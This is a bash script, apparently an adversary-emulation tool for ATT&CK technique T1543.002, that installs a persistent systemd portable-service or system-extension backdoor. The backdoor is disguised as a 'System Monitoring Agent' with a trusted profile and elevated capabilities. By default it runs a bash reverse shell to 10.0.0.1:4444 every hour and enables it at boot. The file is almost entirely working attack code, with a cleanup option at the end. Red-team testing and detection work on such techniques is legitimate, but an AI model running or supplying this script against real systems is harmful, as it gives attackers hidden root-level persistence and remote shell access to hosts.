#!/bin/bash
# T1543.002 — Create/Modify System Process: systemd Portable Service Backdoor
# Deploy malicious portable service image with full host access

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_portable"
WORKDIR="/tmp/.${MARKER}"

banner() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1543.002 — systemd Portable Service        ║"
    echo "  ║   Containerized persistence via OS image      ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

deploy_portable_service() {
    echo -e "${CYAN}[*] Deploying systemd portable service backdoor${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    echo -e "${YELLOW}[*] Portable services are self-contained OS images with systemd units."
    echo -e "    Attached via 'portablectl attach' — runs isolated but can bind-mount host."
    echo -e "    Uses 'trusted' profile for full access. Survives upgrades.${NC}"
    echo ""

    read -p "  Payload command: " CMD
    [[ -z "$CMD" ]] && CMD="bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"

    mkdir -p "$WORKDIR"

    # Check for portablectl
    if ! command -v portablectl &>/dev/null; then
        echo -e "${YELLOW}[!] portablectl not available — using manual image approach${NC}"
        deploy_portable_manual "$CMD"
        return
    fi

    local IMG_NAME="monitoring-agent"
    local IMG_DIR="${WORKDIR}/${IMG_NAME}"
    local IMG_FILE="/var/lib/portables/${IMG_NAME}.raw"

    # Create minimal portable service image
    mkdir -p "${IMG_DIR}/usr/lib/systemd/system"
    mkdir -p "${IMG_DIR}/usr/lib/portable"
    mkdir -p "${IMG_DIR}/usr/bin"
    mkdir -p "${IMG_DIR}/etc"

    # OS release (required by portablectl)
    cat > "${IMG_DIR}/etc/os-release" << OEOF
ID=monitoring-agent
VERSION_ID=1.0
NAME="System Monitoring Agent"
OEOF

    # Service unit
    cat > "${IMG_DIR}/usr/lib/systemd/system/${IMG_NAME}.service" << SEOF
[Unit]
Description=System Monitoring Agent
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/monitor-agent
Restart=always
RestartSec=60
# Run with full privileges
AmbientCapabilities=CAP_NET_RAW CAP_NET_ADMIN CAP_SYS_ADMIN

[Install]
WantedBy=multi-user.target
SEOF

    # Portable profile marker
    cat > "${IMG_DIR}/usr/lib/portable/profile" << PEOF
trusted
PEOF

    # Agent binary (shell script)
    cat > "${IMG_DIR}/usr/bin/monitor-agent" << AEOF
#!/bin/bash
while true; do
    ${CMD} 2>/dev/null
    sleep 3600
done
AEOF
    chmod 755 "${IMG_DIR}/usr/bin/monitor-agent"

    # Create raw image using mksquashfs or dd+ext4
    if command -v mksquashfs &>/dev/null; then
        mkdir -p /var/lib/portables
        mksquashfs "$IMG_DIR" "$IMG_FILE" -quiet -noappend 2>/dev/null
    elif command -v mkfs.ext4 &>/dev/null; then
        dd if=/dev/zero of="$IMG_FILE" bs=1M count=32 2>/dev/null
        mkfs.ext4 -q "$IMG_FILE" 2>/dev/null
        local MNT="${WORKDIR}/mnt"
        mkdir -p "$MNT"
        mount -o loop "$IMG_FILE" "$MNT"
        cp -a "${IMG_DIR}/." "$MNT/"
        umount "$MNT"
    else
        echo -e "${RED}[!] Neither mksquashfs nor mkfs.ext4 available${NC}"
        deploy_portable_manual "$CMD"
        return
    fi

    # Attach the portable service
    portablectl attach "$IMG_FILE" --profile=trusted --enable --now 2>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${GREEN}[+] Portable service attached and running${NC}"
        echo -e "${GREEN}[+] Image: ${IMG_FILE}${NC}"
        echo -e "${GREEN}[+] Service: ${IMG_NAME}.service${NC}"
        echo -e "${YELLOW}[*] Survives OS upgrades — image-based persistence${NC}"
    else
        echo -e "${YELLOW}[!] portablectl attach failed — trying manual method${NC}"
        deploy_portable_manual "$CMD"
    fi
}

deploy_portable_manual() {
    local CMD="$1"
    echo -e "${CYAN}[*] Using manual systemd extension image approach${NC}"

    # Systemd extension images (sysext) - alternative
    local SYSEXT_DIR="/var/lib/extensions/monitoring"
    mkdir -p "${SYSEXT_DIR}/usr/lib/systemd/system"
    mkdir -p "${SYSEXT_DIR}/usr/lib/extension-release.d"
    mkdir -p "${SYSEXT_DIR}/usr/bin"

    # Extension release
    cat > "${SYSEXT_DIR}/usr/lib/extension-release.d/extension-release.monitoring" << REOF
ID=_any
REOF

    # Service
    cat > "${SYSEXT_DIR}/usr/lib/systemd/system/monitoring-agent.service" << SEOF
[Unit]
Description=System Monitoring Agent
After=network.target
[Service]
Type=simple
ExecStart=/usr/bin/monitoring-agent-run
Restart=always
RestartSec=60
[Install]
WantedBy=multi-user.target
SEOF

    # Agent
    cat > "${SYSEXT_DIR}/usr/bin/monitoring-agent-run" << AEOF
#!/bin/bash
# ${MARKER}
while true; do
    ${CMD} 2>/dev/null
    sleep 3600
done
AEOF
    chmod 755 "${SYSEXT_DIR}/usr/bin/monitoring-agent-run"

    # Apply extension
    systemd-sysext merge 2>/dev/null
    systemctl daemon-reload
    systemctl enable monitoring-agent.service 2>/dev/null
    systemctl start monitoring-agent.service 2>/dev/null

    echo -e "${GREEN}[+] System extension deployed: ${SYSEXT_DIR}${NC}"
    echo -e "${GREEN}[+] Service: monitoring-agent.service${NC}"
    echo -e "${YELLOW}[*] Alternative to portable images — similar effect${NC}"
}

cleanup() {
    echo -e "${CYAN}[*] Cleaning up portable service...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Detach portable service
    portablectl detach monitoring-agent 2>/dev/null

    # Stop and remove manual service
    systemctl stop monitoring-agent.service 2>/dev/null
    systemctl disable monitoring-agent.service 2>/dev/null

    # Remove image
    rm -f /var/lib/portables/monitoring-agent.raw

    # Remove sysext
    rm -rf /var/lib/extensions/monitoring
    systemd-sysext unmerge 2>/dev/null

    systemctl daemon-reload
    rm -rf "$WORKDIR"

    echo -e "${GREEN}[+] Portable service removed${NC}"
}

main() {
    banner

    echo -e "  ${CYAN}[1]${NC} Deploy portable service backdoor"
    echo -e "  ${CYAN}[2]${NC} Cleanup"
    echo ""
    read -p "Choose [1-2]: " OPT

    case "$OPT" in
        1) deploy_portable_service ;;
        2) cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
